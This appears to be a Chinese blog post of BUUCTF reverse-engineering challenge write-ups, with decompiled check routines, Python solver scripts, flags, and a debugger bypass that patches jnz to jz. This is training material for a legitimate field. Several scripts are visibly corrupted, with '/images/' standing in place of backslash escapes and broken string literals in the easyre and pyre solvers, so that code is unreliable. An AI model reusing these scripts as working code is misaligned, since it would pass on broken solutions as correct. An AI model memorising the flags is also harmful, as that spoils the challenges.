<h2 id="buuctf-Java逆向解密"><a href="#buuctf-Java逆向解密" class="headerlink" title="buuctf-Java逆向解密"></a>buuctf-Java逆向解密</h2><p>题目给的附件我们打开是一个class文件，我们都知道这是<code>.java</code>源文件编译之后生成的文件，我们使用<code>JD-GUI</code>打开即可：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reverse</span> &#123;  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">    System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> s.next();  </span><br><span class="line">    System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);  </span><br><span class="line">    System.out.println(str);  </span><br><span class="line">    <span class="type">char</span>[] stringArr = str.toCharArray();  </span><br><span class="line">    Encrypt(stringArr);  </span><br><span class="line">  &#125;  </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">char</span>[] arr)</span> &#123;  </span><br><span class="line">    ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;  </span><br><span class="line">      <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> arr[i] + <span class="number">64</span> ^ <span class="number">0x20</span>;  </span><br><span class="line">      Resultlist.add(Integer.valueOf(result));  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="type">int</span>[] KEY = &#123;   </span><br><span class="line">        <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,   </span><br><span class="line">        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;  </span><br><span class="line">    ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; KEY.length; j++)  </span><br><span class="line">      KEYList.add(Integer.valueOf(KEY[j]));   </span><br><span class="line">    System.out.println(<span class="string">&quot;Result:&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;  </span><br><span class="line">      System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">      System.err.println(<span class="string">&quot;Error！&quot;</span>);  </span><br><span class="line">    &#125;   </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>题目逻辑比较简单，这里直接给出脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>,</span><br><span class="line">        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">flagstr = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    flagstr += <span class="built_in">chr</span>(flag[i] - <span class="number">64</span> ^ <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flagstr)</span><br></pre></td></tr></table></figure></div>
<h2 id="BJDCTF2020-JustRE（消息断点）"><a href="#BJDCTF2020-JustRE（消息断点）" class="headerlink" title="[BJDCTF2020]JustRE（消息断点）"></a>[BJDCTF2020]JustRE（消息断点）</h2><p>DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-DIE.png"
                      alt="JustRE-DIE"
                ><br>32位PE文件，C++编写<br>尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-1.png"
                      alt="JustRE-1"
                ><br>是一个界面程序，看到有一个getflag按钮，这里尝试点进去：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-2.png"
                      alt="JustRE-2"
                ><br>flag应该就在这里了，这里也不静态分析了，直接x64dbg：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-x32dbg_1.png"
                      alt="JustRE-x32dbg_1"
                ><br>找到句柄窗口，刷新一下，就能看到按钮了，我们在Check句柄上下一个条件断点，条件为，ebp+8为<code>WM_LBUTTONUP</code>，这个条件是试出来的，因为鼠标左键抬起的时候，程序就有变化，所以是这个断点。<br>然后我们就能看到断在了user32.dll：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-x32dbg_2.png"
                      alt="JustRE-x32dbg_2"
                ><br>这时候，单步运行是回不到exe模块中的因为IsDialogMessage会把句柄传递给ring0。<br>我们需要给exe的代码段下一个一次性运行断点即可：<br>x32dbg找到内存布局，找到该EXE的代码段，下一个一次性执行断点：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-x32dbg_3.png"
                      alt="JustRE-x32dbg_3"
                ><br>然后直接F9，就能回到exe模块了：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-x32dbg_4.png"
                      alt="JustRE-x32dbg_4"
                ><br>这里可以很明显地看到，这就是验证点击次数，输出flag的逻辑，然后单步往下走，将对比逻辑跳过，或者在跳转的地方改一下标志寄存器即可：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-x32dbg_5.png"
                      alt="JustRE-x32dbg_5"
                ><br>这里有两种修改方法：</p>
<ol>
<li>直接将zf标志位反转</li>
<li>将<code>jnz</code>patch为<code>jz</code>即可<br>然后让他把生成flag的逻辑走完，在堆栈中就能看到flag了：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-x32dbg_6.png"
                      alt="JustRE-x32dbg_6"
                ><br>程序上也能看到：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/JustRE-flag.png"
                      alt="JustRE-flag"
                ></li>
</ol>
<h2 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="ACTF新生赛2020-easyre"></a>ACTF新生赛2020-easyre</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/easyre-die.png"
                      alt="easyre-die"
                ><br>32位PE文件，UPX的壳，那用工具脱一下壳，然后IDA加载：<br>逻辑比较简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;/images/&quot;</span>N,/images/<span class="string">&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v10 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>就是说，<code>_data_start__</code>字符串，以我们输入的字符+i-1为索引，比对v4字符串即可，那么我们写个脚本破解就行：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">v4 = [<span class="number">42</span>,<span class="number">70</span>,<span class="number">39</span>,<span class="number">34</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">63</span>,<span class="number">43</span>,<span class="number">64</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">&quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]/images/[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;? !/images/&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">for i in v4:</span></span><br><span class="line"><span class="string">    flag += chr(key.find(chr(i))+1)</span></span><br><span class="line"><span class="string">    print(flag)</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/easy-die_flag.png"
                      alt="easy-die_flag"
                ></p>
<h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="GWCTF 2019-pyre"></a>GWCTF 2019-pyre</h2><p>我们拿到附件，发现是一个pyc文件，很明显的py逆向，我们可以使用自己的工具或者网上的工具（pycdc）进行反编译：<br>这里有一个<a class="link"   href="https://tool.lu/pyc/" >在线网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>可以使用.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;%1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%13&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>逻辑也很简单，首先对code加，然后异或加密，我们只要对应写出逆向脚本即可：先异或然后减：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">code = [<span class="string">&#x27;/images/x1f&#x27;</span>,<span class="string">&#x27;/images/x12&#x27;</span>,<span class="string">&#x27;/images/x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;/images/x01&#x27;</span>,<span class="string">&#x27;/images/x06&#x27;</span>,<span class="string">&#x27;/images/x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;/images/x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;/images/x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;/images/x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>,-<span class="number">1</span>, - <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    code[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i]) ^ <span class="built_in">ord</span>(code[i + <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(code)):</span><br><span class="line"></span><br><span class="line">    num = <span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i]) - i)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    flag +=num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="ACTF新生赛2020-rome"></a>ACTF新生赛2020-rome</h2><p>DIE查壳：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/rome_die.png"
                      alt="rome_die"
                ><br>无壳，32位PE文件，C语言编写。<br>尝试运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/rome_1.png"
                      alt="rome_1"
                ><br>IDA Pro加载，对着写加密操作就行:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse</span>():</span><br><span class="line">    flag=<span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span></span><br><span class="line">    result=[]</span><br><span class="line">    flag1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i)&gt;<span class="number">64</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">90</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(i)-<span class="number">64</span>)-<span class="number">14</span>)%<span class="number">26</span>+<span class="number">64</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(i)&gt;<span class="number">96</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">122</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>(((<span class="built_in">ord</span>(i)-<span class="number">97</span>)-<span class="number">18</span>)%<span class="number">26</span>+<span class="number">97</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        flag1 += flag1.join(result[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>+flag1+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">reverse()</span><br></pre></td></tr></table></figure></div>
<h2 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="WUSTCTF2020-level1"></a>WUSTCTF2020-level1</h2><p>DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/WUSTCTF2020-level1_die.png"
                      alt="WUSTCTF2020-level1_die"
                ><br>64位ELF文件，C语言编写，无壳。<br>IDA Pro加载：<br>逻辑很简单：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x14u</span>LL, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld/images/n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(ptr[i] &lt;&lt; i));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%ld/images/n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i * ptr[i]));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>只是对字符串进行了简单的左移和相乘操作，写出脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = [<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span>,<span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((i+<span class="number">1</span>)&amp;<span class="number">1</span>!=<span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] &gt;&gt; (i+<span class="number">1</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] // (i + <span class="number">1</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>ctf2020{d9-dE6-20c}</p>
<h2 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="GUET-CTF2019-re"></a>GUET-CTF2019-re</h2><p>DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/BUUCTF/GUET-CTF2019-re.png"
                      alt="GUET-CTF2019-re"
                ><br>UPX的壳，用工具解了就行，然后IDA Pro加载：<br>shift+F2找到字符串“input your flag”，然后就能看到验证逻辑：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_4009AE</span><span class="params">(<span class="type">char</span> *InputStr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *InputStr != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * InputStr[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * InputStr[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * InputStr[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * InputStr[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * InputStr[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * InputStr[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * InputStr[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * InputStr[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * InputStr[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * InputStr[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * InputStr[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * InputStr[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * InputStr[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * InputStr[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * InputStr[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * InputStr[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * InputStr[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * InputStr[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * InputStr[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * InputStr[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * InputStr[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * InputStr[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * InputStr[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * InputStr[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * InputStr[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * InputStr[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * InputStr[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * InputStr[<span 